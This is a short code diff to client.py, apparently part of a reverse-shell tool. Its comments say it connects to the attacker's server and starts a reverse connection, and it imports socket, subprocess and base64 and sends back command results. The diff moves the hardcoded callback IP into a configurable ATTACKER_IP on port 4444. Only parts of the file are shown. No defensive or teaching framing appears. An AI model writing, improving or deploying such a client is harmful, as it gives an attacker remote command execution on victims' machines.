@@ -1,5 +1,7 @@
 # client.py
-import socket, json, subprocess, os, base64, time
+import socket, json, subprocess, os, base64, time, config
+
+listener_ip = config.ATTACKER_IP
 
 # Connects to attacker's server
 def server(ip, port):
@@ -51,5 +53,5 @@ def run():
                 send(result)
             
 # Start reverse connection
-server('192.168.1.102', 4444)
+server(listener_ip, 4444)
 run()
